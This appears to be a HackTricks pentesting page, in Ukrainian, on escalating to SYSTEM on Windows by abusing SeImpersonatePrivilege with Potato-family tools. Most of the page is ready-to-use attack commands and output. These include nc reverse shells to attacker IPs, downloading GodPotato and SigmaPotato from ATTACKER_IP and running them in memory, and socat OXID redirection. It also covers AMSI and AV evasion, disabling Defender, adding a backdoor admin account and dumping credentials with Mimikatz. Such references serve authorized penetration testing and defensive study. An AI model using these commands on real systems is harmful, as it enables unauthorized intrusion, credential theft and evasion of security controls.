# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 і Windows 10 build 1809 та новіших версіях. Однак [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можна використовувати для **експлуатації тих самих привілеїв і отримання доступу рівня `NT AUTHORITY\SYSTEM`**. У цій [публікації в блозі](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально розглядається інструмент `PrintSpoofer`, який можна використовувати для зловживання привілеями impersonation на хостах Windows 10 і Server 2019, де JuicyPotato більше не працює.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Сучасною альтернативою, яку активно підтримують у 2024–2025 роках, є SigmaPotato (fork GodPotato), що додає використання in-memory/.NET reflection і розширену підтримку ОС. Дивіться короткий приклад використання нижче та репозиторій у References.

Пов’язані сторінки з довідковою інформацією та ручними техніками:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені підводні камені

Усі наведені нижче техніки ґрунтуються на зловживанні привілейованою службою, здатною виконувати impersonation, із контексту, що має один із таких привілеїв:

- SeImpersonatePrivilege (найпоширеніший) або SeAssignPrimaryTokenPrivilege
- Високий рівень integrity не потрібен, якщо токен уже має SeImpersonatePrivilege (типово для багатьох облікових записів служб, таких як IIS AppPool, MSSQL тощо)

Швидка перевірка привілеїв:
```cmd
whoami /priv | findstr /i impersonate
```
Операційні примітки:

- Якщо ваш shell працює в обмеженому token без SeImpersonatePrivilege (поширено для Local Service/Network Service у деяких контекстах), відновіть стандартні privileges облікового запису за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer потребує, щоб служба Print Spooler була запущена та доступна через локальну RPC endpoint (spoolss). У hardened environments, де Spooler вимкнено після PrintNightmare, використовуйте RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato потребує OXID resolver, доступний через TCP/135. Якщо egress заблоковано, використовуйте redirector/port-forwarder (див. приклад нижче). У старіших збірках був потрібен прапорець -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай означає невідому або непідтримувану RPC authentication service; спробуйте інший pipe/transport або переконайтеся, що цільова служба запущена.
- “Kitchen-sink” forks, такі як DeadPotato, містять додаткові payload modules (Mimikatz/SharpHound/Defender off), які записують дані на диск; очікуйте вищий рівень EDR detection порівняно з оригінальними slim-версіями.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використати `-i`, щоб запустити interactive process у поточній консолі, або `-c`, щоб виконати one-liner.
- Потрібна служба Spooler. Якщо її вимкнено, це не спрацює.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо вихідний порт 135 заблоковано, перенаправте OXID resolver через socat на вашому redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato — це новіший primitive для COM abuse, випущений наприкінці 2022 року, який атакує службу **PrintNotify**, а не Spooler/BITS. Бінарний файл створює екземпляр COM-сервера PrintNotify, підміняє `IUnknown` на fake-об'єкт, а потім запускає privileged callback через `CreatePointerMoniker`. Коли служба PrintNotify (яка працює від імені **SYSTEM**) підключається у відповідь, процес дублює отриманий token і запускає вказаний payload із повними привілеями.<sup>[[13]](#references)</sup>

Основні операційні примітки:

* Працює у Windows 10/11 і Windows Server 2012–2022, якщо встановлено службу Print Workflow/PrintNotify (вона присутня навіть тоді, коли legacy Spooler вимкнено після PrintNightmare).
* Потрібно, щоб контекст, у якому виконується виклик, мав `SeImpersonatePrivilege` (типово для IIS APPPOOL, MSSQL і service accounts запланованих завдань).
* Приймає або безпосередню команду, або interactive mode, що дає змогу залишатися в оригінальній консолі. Приклад:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Оскільки він повністю базується на COM, named-pipe listeners або зовнішні redirectors не потрібні, що робить його drop-in replacement на хостах, де Defender блокує RPC binding RoguePotato.

Такі оператори, як Ink Dragon, запускають PrintNotifyPotato одразу після отримання ViewState RCE на SharePoint, щоб виконати pivot від worker-процесу `w3wp.exe` до SYSTEM перед встановленням ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: Якщо один pipe не працює або EDR блокує його, спробуйте інші підтримувані pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює у Windows 8/8.1–11 і Server 2012–2022, якщо присутній SeImpersonatePrivilege.
- Завантажте binary, що відповідає встановленому runtime (наприклад, `GodPotato-NET4.exe` на сучасному Server 2022).
- Якщо вашим початковим execution primitive є webshell/UI із короткими тайм-аутами, підготуйте payload як script і попросіть GodPotato запустити його замість довгої inline-команди.<sup>[[12]](#references)</sup>

Швидкий шаблон staging із доступного для запису IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato надає два варіанти для роботи з сервісними DCOM-об’єктами, які за замовчуванням використовують RPC_C_IMP_LEVEL_IMPERSONATE. Зберіть або використайте надані бінарні файли та виконайте свою команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні можливості, зокрема виконання в пам’яті через .NET reflection і допоміжний інструмент PowerShell reverse shell.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Додаткові переваги у збірках 2024–2025 років (v1.2.x):
- Вбудований прапорець reverse shell `--revshell` і скасування обмеження PowerShell у 1024 символи, тож можна одразу запускати довгі payloads з обходом AMSI.
- Синтаксис, сумісний із Reflection (`[SigmaPotato]::Main()`), а також базовий трюк обходу AV через `VirtualAllocExNuma()`, щоб ввести в оману прості евристики.
- Окремий `SigmaPotatoCore.exe`, скомпільований для .NET 2.0, для середовищ PowerShell Core.

### DeadPotato (переробка GodPotato з модулями, 2024 рік)

DeadPotato зберігає ланцюжок OXID/DCOM impersonation у GodPotato, але вбудовує post-exploitation helpers, щоб оператори могли негайно отримати SYSTEM і виконувати persistence/collection без додаткових інструментів.<sup>[[15]](#references)</sup>

Поширені модулі (усі потребують SeImpersonatePrivilege):

- `-cmd "<cmd>"` — запустити довільну команду від імені SYSTEM.
- `-rev <ip:port>` — швидкий reverse shell.
- `-newadmin user:pass` — створити локального адміністратора для persistence.
- `-mimi sam|lsa|all` — скинути на диск і запустити Mimikatz для отримання облікових даних (записує дані на диск, створює багато шуму).
- `-sharphound` — виконати збір даних SharpHound від імені SYSTEM.
- `-defender off` — вимкнути захист Defender у реальному часі (створює дуже багато шуму).

Приклади однорядкових команд:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Оскільки він постачається з додатковими бінарними файлами, очікуйте більше спрацювань AV/EDR; коли важлива stealth, використовуйте компактніший GodPotato/SigmaPotato.

## Посилання

- [1] [PrintSpoofer – Зловживання привілеями Impersonation у Windows 10 і Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Більше жодного JuicyPotato? Стара історія, вітаємо RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Відновлення привілеїв токенів за замовчуванням для облікових записів служб](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — NTLM leak через WMP → NTFS junction до webroot RCE → FullPowers + GodPotato до SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — макрос LibreOffice → IIS webshell → GodPotato до SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Всередині Ink Dragon: розкриття relay-мережі та внутрішньої роботи stealth offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – переробка GodPotato із вбудованими post-ex модулями](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
